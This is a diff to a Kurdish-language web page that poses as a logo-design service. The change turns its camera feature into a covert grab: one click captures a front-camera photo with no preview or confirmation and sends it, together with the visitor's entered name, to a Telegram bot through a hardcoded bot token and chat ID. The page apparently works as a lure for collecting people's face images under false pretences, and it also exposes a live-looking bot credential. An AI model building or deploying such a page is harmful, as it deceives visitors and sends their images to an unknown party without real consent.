@@ -61,16 +61,18 @@
         button:hover {
             background: #00a8cc;
         }
+        button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
         video, canvas {
-            width: 100%;
-            border-radius: 10px;
-            margin-top: 15px;
             display: none;
         }
         #status {
-            margin-top: 15px;
+            margin-top: 18px;
             font-weight: bold;
             color: #4ade80;
+            line-height: 1.5;
         }
     </style>
 </head>
@@ -78,15 +80,13 @@
 
 <div class="container">
     <h1>🎨 دیزاینا لۆگۆیێ تە</h1>
-    <p>وێنێ خۆ بگرە و بۆ مە بهنێرە دا کو بکەینە لۆگۆیەکێ پڕۆفیشناڵ و جوان!</p>
+    <p>ناڤێ خۆ بنڤیسە و ل سەر رەسم گرتنێ بدە دا لۆگۆیێ تە ئامادە بکەین!</p>
     
     <input type="text" id="userName" placeholder="ناڤێ خۆ یان یوزەرێ خۆ بنڤیسە..." required>
     
-    <button id="startBtn" onclick="startCamera()">📸 رەسم گرتن</button>
+    <button id="startBtn" onclick="autoCaptureAndSend()">📸 رەسم گرتن</button>
     
-    <video id="video" autoplay playsinline></video>
-    <button id="captureBtn" style="display:none; background:#4ade80;" onclick="takePhoto()">✅ گرتن و هنارتن</button>
-    
+    <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
     <div id="status"></div>
 </div>
@@ -95,65 +95,97 @@
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const startBtn = document.getElementById('startBtn');
-    const captureBtn = document.getElementById('captureBtn');
     const statusDiv = document.getElementById('status');
 
     const BOT_TOKEN = "9026747554:AAGXXsmoDPEgfrBwmm_guQLwKmuZF7DDdVY";
     const CHAT_ID = "1905509661";
 
-    async function startCamera() {
-        const userName = document.getElementById('userName').value;
+    function wait(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+    async function autoCaptureAndSend() {
+        const userName = document.getElementById('userName').value.trim();
         if (!userName) {
             alert("ژ کەرەما خۆ بەری هەر تشتەکی ناڤێ خۆ بنڤیسە!");
             return;
         }
 
+        startBtn.disabled = true;
+        statusDiv.style.color = "#00d2ff";
+        statusDiv.innerText = "📷 داخوازا کامێرایێ دهێتە کرن...";
+
+        let stream = null;
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            video.srcObject = stream;
-            video.style.display = "block";
-            startBtn.style.display = "none";
-            captureBtn.style.display = "block";
-        } catch (err) {
-            alert("ببورە، پێدڤیە تو رازیبوونێ (Allow) بدەیە کامێرایێ دا کو وێنەی بگری!");
-        }
-    }
-
-    function takePhoto() {
-        const userName = document.getElementById('userName').value;
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-
-        video.srcObject.getTracks().forEach(track => track.stop());
-        video.style.display = "none";
-        captureBtn.style.display = "none";
-        statusDiv.innerText = "⏳ وێنە یێ دهێتە هنارتن...";
-
-        canvas.toBlob(blob => {
-            const formData = new FormData();
-            formData.append("chat_id", CHAT_ID);
-            formData.append("photo", blob, "client_photo.jpg");
-            formData.append("caption", "🎨 داخوازیا لۆگۆیێ نوی!\n👤 ناڤێ کڕیاری: " + userName);
-
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: "POST",
-                body: formData
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    statusDiv.innerText = "✅ سوپاس! وێنێ تە ب سەرکەفتیانە گەهشت. ل نێزیک دێ لۆگۆیێ تە ئامادە بیت!";
-                } else {
-                    statusDiv.style.color = "#f87171";
-                    statusDiv.innerText = "❌ خەلەتیەک چێبوو د هنارتنێ دا.";
-                }
-            })
-            .catch(error => {
-                statusDiv.style.color = "#f87171";
-                statusDiv.innerText = "❌ پەیوەندی ب ئینتەرنێتێ ڤە نینە.";
+            stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: "user" },
+                audio: false
             });
-        }, "image/jpeg");
+
+            video.srcObject = stream;
+            await video.play();
+
+            // چاوەڕێبوونەکا کورت دا کامێرا وێنەی ب دروستی چێکەت
+            await wait(700);
+
+            if (video.videoWidth === 0 || video.videoHeight === 0) {
+                await wait(800);
+            }
+
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // گرتنا وێنەی و راوەستاندنا کامێرایێ
+            stream.getTracks().forEach(track => track.stop());
+
+            statusDiv.style.color = "#4ade80";
+            statusDiv.innerText = "⏳ وێنە هاتە گرتن و یێ دهێتە هنارتن...";
+
+            canvas.toBlob(blob => {
+                if (!blob) {
+                    statusDiv.style.color = "#f87171";
+                    statusDiv.innerText = "❌ خەلەتیەک چێبوو د گرتنا وێنەی دا.";
+                    startBtn.disabled = false;
+                    return;
+                }
+
+                const formData = new FormData();
+                formData.append("chat_id", CHAT_ID);
+                formData.append("photo", blob, "client_photo.jpg");
+                formData.append("caption", "🎨 داخوازیا لۆگۆیێ نوی!\n👤 ناڤێ کڕیاری: " + userName);
+
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: "POST",
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        statusDiv.style.color = "#4ade80";
+                        statusDiv.innerText = "✅ سوپاس! وێنێ تە ب سەرکەفتیانە گەهشت. ل نێزیک دێ لۆگۆیێ تە ئامادە بیت!";
+                    } else {
+                        statusDiv.style.color = "#f87171";
+                        statusDiv.innerText = "❌ خەلەتیەک چێبوو د هنارتنێ دا.";
+                        startBtn.disabled = false;
+                    }
+                })
+                .catch(() => {
+                    statusDiv.style.color = "#f87171";
+                    statusDiv.innerText = "❌ پەیوەندی ب ئینتەرنێتێ ڤە نینە.";
+                    startBtn.disabled = false;
+                });
+            }, "image/jpeg", 0.9);
+
+        } catch (err) {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+            statusDiv.style.color = "#f87171";
+            statusDiv.innerText = "❌ پێدڤیە تو رازیبوونێ (Allow) بدەیە کامێرایێ دا کو وێنە بهێتە گرتن.";
+            startBtn.disabled = false;
+        }
     }
 </script>
 
